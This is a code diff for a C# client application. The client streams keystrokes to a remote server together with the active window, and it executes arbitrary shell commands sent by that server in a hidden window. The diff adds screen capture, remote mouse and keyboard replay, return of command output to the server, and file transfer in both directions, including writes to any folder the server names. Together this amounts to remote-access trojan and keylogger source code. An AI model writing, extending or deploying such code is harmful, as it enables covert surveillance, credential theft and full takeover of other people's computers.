@@ -43,6 +43,8 @@ namespace CLIENT.ViewModels
 
             KeyboardDetector.OnKeyPressed += async (key, isUpperCase, isShiftPressed, isCtrlPressed) =>
             {
+                if (_client == null || !_client.Connected) return;
+
                 string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                 string windowInfo = WindowDetector.GetActiveWindowInfo();
                 if(_speak) { 
@@ -103,14 +105,33 @@ namespace CLIENT.ViewModels
         {
             try
             {
+                // Use a larger buffer so commands are never split mid-message
+                var buffer = new byte[8192];
+
                 while (_client != null && _client.Connected)
                 {
-                    var buffer = new byte[1024];
                     int bytesRead = await _stream.ReadAsync(buffer, 0, buffer.Length);
-                    if (bytesRead == 0) break; // Server disconnected
+                    if (bytesRead == 0) break;
 
                     string serverMessage = Encoding.UTF8.GetString(buffer, 0, bytesRead);
 
+                    // ── Remote input: handle immediately on a thread-pool thread
+                    //    (NOT the UI thread) so SendInput is never blocked.
+                    if (serverMessage.StartsWith("input:mouse:"))
+                    {
+                        string payload = serverMessage.Substring(12).Trim();
+                        _ = Task.Run(() => RemoteInput.ReplayMouse(payload));
+                        continue;
+                    }
+
+                    if (serverMessage.StartsWith("input:key:"))
+                    {
+                        string payload = serverMessage.Substring(10).Trim();
+                        _ = Task.Run(() => RemoteInput.ReplayKey(payload));
+                        continue;
+                    }
+
+                    // ── All other commands go to the UI thread
                     await Dispatcher.UIThread.InvokeAsync(() =>
                     {
                         if (serverMessage.StartsWith("__upload_file:"))
@@ -118,64 +139,69 @@ namespace CLIENT.ViewModels
                             string command = serverMessage.Substring(14).Trim();
                             UploadFile(command);
                         }
-
-                        if (serverMessage.StartsWith("__download_file:"))
+                        else if (serverMessage.StartsWith("__download_file:"))
                         {
                             string command = serverMessage.Substring(16).Trim();
                             DownloadTargetFile(command);
                         }
-
-                        if (serverMessage.StartsWith("__open_file:"))
+                        else if (serverMessage.StartsWith("__open_file:"))
                         {
                             string command = serverMessage.Substring(12).Trim();
                             SendFilePath(command);
                         }
-
-                        if (serverMessage.StartsWith("cmd:"))
+                        else if (serverMessage.StartsWith("__screen_start"))
+                        {
+                            ScreenCapture.Start(_stream, fps: 10);
+                        }
+                        else if (serverMessage.StartsWith("__screen_stop"))
+                        {
+                            ScreenCapture.Stop();
+                        }
+                        else if (serverMessage.StartsWith("cmd:"))
                         {
                             string command = serverMessage.Substring(4).Trim();
-                            try
+                            AppendMessageToLogAsync($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [CMD] Executing: {command}");
+                            _ = Task.Run(async () =>
                             {
-                            
-                                
-                                        // Create a new process to run the command in cmd
-                                        ProcessStartInfo processStartInfo = new ProcessStartInfo()
+                                try
+                                {
+                                    var processStartInfo = new ProcessStartInfo()
+                                    {
+                                        FileName = "cmd.exe",
+                                        Arguments = $"/c {command}",
+                                        RedirectStandardOutput = true,
+                                        RedirectStandardError = true,
+                                        UseShellExecute = false,
+                                        CreateNoWindow = true
+                                    };
+                                    using (Process process = Process.Start(processStartInfo))
+                                    {
+                                        if (process != null)
                                         {
-                                            FileName = "cmd.exe",
-                                            Arguments = $"/c {command}",  // /c executes the command and terminates
-                                            RedirectStandardOutput = true, // Redirect the output to read it
-                                            UseShellExecute = false,      // Don't use shell execute to get output
-                                            CreateNoWindow = true         // Don't show the command prompt window
-                                        };
+                                            string output = await process.StandardOutput.ReadToEndAsync();
+                                            string error = await process.StandardError.ReadToEndAsync();
+                                            await process.WaitForExitAsync();
 
-                                        using (Process process = Process.Start(processStartInfo))
-                                        {
-                                            if (process != null)
-                                            {
-                                                string output = process.StandardOutput.ReadToEnd();  // Capture the output
-                                                process.WaitForExit(); // Wait for the process to exit
-
-                                                // You can handle the output here, e.g., log it or display it
-                                                Console.WriteLine($"Command output: {output}");
-                                            }
+                                            string result = string.IsNullOrEmpty(output) ? error : output;
+                                            AppendMessageToLogAsync($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [CMD] Result: {result?.Trim()}");
+                                            if (!string.IsNullOrEmpty(result))
+                                                await SendKeyLoggerAsync($"cmd_output:{result}");
                                         }
-                                
-                            }
-                            catch (Exception ex)
-                            {
-                                // Handle any exceptions that may occur
-                                Console.WriteLine($"Error running command: {ex.Message}");
-                            }
-
-                        }
-                        else
-                        {
+                                    }
+                                }
+                                catch (Exception ex)
+                                {
+                                    AppendMessageToLogAsync($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [CMD] Error: {ex.Message}");
+                                    await SendKeyLoggerAsync($"cmd_output:Error: {ex.Message}");
+                                }
+                            });
                         }
                     });
                 }
             }
             catch (Exception ex)
             {
+                Console.WriteLine($"ListenToServerAsync error: {ex.Message}");
             }
 
             // Reconnect on disconnect
@@ -255,15 +281,18 @@ namespace CLIENT.ViewModels
                             await _stream.FlushAsync();
 
                             response = $"File '{Path.GetFileName(command)}' successfully sent to the server.";
+                            AppendMessageToLogAsync($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [DOWNLOAD] Sent file '{Path.GetFileName(command)}' ({fileBytes.Length} bytes) to server.");
                         }
                         catch (IOException ioEx)
                         {
                             response = $"File access error: {ioEx.Message}";
+                            AppendMessageToLogAsync($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [DOWNLOAD] File access error for '{command}': {ioEx.Message}");
                         }
                     }
                     else
                     {
                         response = "Invalid or non-existent file path.";
+                        AppendMessageToLogAsync($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [DOWNLOAD] Invalid or non-existent file path: '{command}'");
                     }
                 }
                 else
@@ -273,6 +302,7 @@ namespace CLIENT.ViewModels
             }
             catch (Exception ex)
             {
+                AppendMessageToLogAsync($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [DOWNLOAD] Error: {ex.Message}");
             }
         }
 
@@ -282,33 +312,34 @@ namespace CLIENT.ViewModels
             {
                 if (_client != null && _client.Connected && _stream != null)
                 {
-                    string[] parts = command.Split(':');
-                    if (parts.Length == 2)
+                    // Protocol: "<destFolder>:<name>:<size>"
+                    // destFolder may contain colons (e.g. C:\...) so split from the right.
+                    int lastColon  = command.LastIndexOf(':');
+                    int secondLast = lastColon > 0 ? command.LastIndexOf(':', lastColon - 1) : -1;
+
+                    if (lastColon > 0 && secondLast > 0
+                        && int.TryParse(command.Substring(lastColon + 1), out int fileSize))
                     {
-                        string fileName = parts[0];
-                        if (int.TryParse(parts[1], out int fileSize))
+                        string destFolder = command.Substring(0, secondLast);
+                        string fileName   = command.Substring(secondLast + 1, lastColon - secondLast - 1);
+
+                        NetworkStream clientStream = _client.GetStream();
+
+                        byte[] buffer = new byte[fileSize];
+                        int totalBytesRead = 0;
+                        int bytesRead;
+
+                        while (totalBytesRead < fileSize &&
+                               (bytesRead = clientStream.Read(buffer, totalBytesRead, fileSize - totalBytesRead)) > 0)
                         {
-                            // Get the stream from the client connection
-                            NetworkStream clientStream = _client.GetStream(); // Ensure 'client' is your TcpClient
-
-                            // Create a buffer to read file content
-                            byte[] buffer = new byte[fileSize];
-                            int totalBytesRead = 0;
-                            int bytesRead;
-
-                            // Read the file content from the client stream
-                            while (totalBytesRead < fileSize &&
-                                   (bytesRead = clientStream.Read(buffer, totalBytesRead, fileSize - totalBytesRead)) > 0)
-                            {
-                                totalBytesRead += bytesRead;
-                            }
-
-                            // Save the file to the server's file system
-                            string savePath = Path.Combine("file_downloaded", fileName);
-                            Directory.CreateDirectory("file_downloaded"); // Ensure the directory exists
-                            File.WriteAllBytes(savePath, buffer);
-
+                            totalBytesRead += bytesRead;
                         }
+
+                        // Save to the destination folder specified by the admin
+                        Directory.CreateDirectory(destFolder);
+                        string savePath = Path.Combine(destFolder, fileName);
+                        File.WriteAllBytes(savePath, buffer);
+                        AppendMessageToLogAsync($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [UPLOAD] Received file '{fileName}' ({totalBytesRead} bytes) saved to '{savePath}'.");
                     }
                 }
                 else
@@ -318,6 +349,8 @@ namespace CLIENT.ViewModels
             }
             catch (Exception ex)
             {
+                AppendMessageToLogAsync($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [UPLOAD] Error: {ex.Message}");
+                Console.WriteLine($"UploadFile error: {ex.Message}");
             }
         }
 
